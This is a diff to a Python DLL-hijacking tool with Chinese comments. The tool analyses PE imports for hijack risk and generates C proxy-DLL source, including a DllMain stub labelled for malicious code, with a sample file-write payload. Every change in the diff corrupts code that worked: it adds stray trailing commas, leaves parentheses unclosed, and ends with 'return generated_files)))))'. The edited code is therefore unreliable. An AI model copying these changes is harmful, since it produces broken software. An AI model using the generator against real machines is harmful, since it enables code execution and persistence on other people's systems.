@@ -134,14 +134,14 @@ class DLLHijackAnalyzer:
         Returns:
             是否加载成功
         """
-        path = pe_path or self.pe_path
+        path = pe_path or self.pe_path,
         if not path:
             logger.error("未指定PE文件路径")
             return False
             
         try:
             self.pe = pefile.PE(path)
-            self.pe_path = path
+            self.pe_path = path,
             return True
         except Exception as e:
             logger.error(f"加载PE文件失败: {e}")
@@ -167,7 +167,8 @@ class DLLHijackAnalyzer:
                 
                 for imp in entry.imports:
                     if imp.name:
-                        imports.append(imp.name.decode('utf-8', errors='replace'))
+                        imports.append(imp.name.decode('utf-8', errors='replace'
+
                     else:
                         imports.append(f"ordinal_{imp.ordinal}")
                 
@@ -182,7 +183,8 @@ class DLLHijackAnalyzer:
                 
                 for imp in entry.imports:
                     if imp.name:
-                        imports.append(imp.name.decode('utf-8', errors='replace'))
+                        imports.append(imp.name.decode('utf-8', errors='replace'
+
                     else:
                         imports.append(f"ordinal_{imp.ordinal}")
                 
@@ -217,11 +219,11 @@ class DLLHijackAnalyzer:
             import_type=import_type,
             risk_level=risk_level,
             is_system_dll=is_system_dll,
-            known_hijack_dll=known_hijack_dll
-        )
+            known_hijack_dll=known_hijack_dll)
+        
+
     
-    def _evaluate_risk(self, dll_name: str, has_path: bool, is_system_dll: bool, 
-                       known_hijack_dll: bool, import_type: ImportType) -> HijackRiskLevel:
+    def _evaluate_risk(self, dll_name: str, has_path: bool, is_system_dll: bool, known_hijack_dll: bool, import_type: ImportType) -> HijackRiskLevel:
         """
         评估DLL劫持风险
         
@@ -354,7 +356,7 @@ HMODULE g_hOriginalDll = NULL;
 // 导出函数转发宏
 #define FORWARD_FUNCTION(ret, func, args) \\
 ret WINAPI My_##func args {{ \\
-    static ret (WINAPI *pOriginal)(args) = NULL; \\
+    static ret (WINAPI *pOriginal)(args) = NULL; \\,
     if (!pOriginal) {{ \\
         pOriginal = (ret (WINAPI*)(args))GetProcAddress(g_hOriginalDll, #func); \\
     }} \\
@@ -371,11 +373,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
                 GetSystemDirectoryW(szPath, MAX_PATH);
                 wcscat_s(szPath, MAX_PATH, L"\\\\");
                 wcscat_s(szPath, MAX_PATH, ORIGINAL_DLL);
-                g_hOriginalDll = LoadLibraryW(szPath);
+                g_hOriginalDll = LoadLibraryW(szPath);,
                 if (!g_hOriginalDll) {{
                     // 尝试从应用程序目录加载
                     GetModuleFileNameW(NULL, szPath, MAX_PATH);
-                    WCHAR *p = wcsrchr(szPath, L'\\\\');
+                    WCHAR *p = wcsrchr(szPath, L'\\\\');,
                     if (p) *p = 0;
                     wcscat_s(szPath, MAX_PATH, L"\\\\");
                     wcscat_s(szPath, MAX_PATH, ORIGINAL_DLL);
@@ -387,7 +389,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
             {{
                 // TODO: 在此添加恶意代码
                 // 示例：创建文件
-                FILE *f = fopen("C:\\\\temp\\\\hijacked.txt", "w");
+                FILE *f = fopen("C:\\\\temp\\\\hijacked.txt", "w");,
                 if (f) {{
                     fprintf(f, "DLL Hijack Successful! PID: %d\\n", GetCurrentProcessId());
                     fclose(f);
@@ -407,7 +409,8 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
 // 需要转发的函数声明
 // TODO: 根据目标DLL的导出表添加转发函数
 // 示例:
-// FORWARD_FUNCTION(int, MessageBoxA, (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType))
+// FORWARD_FUNCTION(int, MessageBoxA, (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType
+
 """
         
         if output_path:
@@ -536,4 +539,4 @@ def generate_hijack_dll(pe_path: str, output_dir: str = ".") -> List[str]:
         analyzer.generate_hijack_dll_code(dll.name, output_path)
         generated_files.append(output_path)
     
-    return generated_files
+    return generated_files)))))
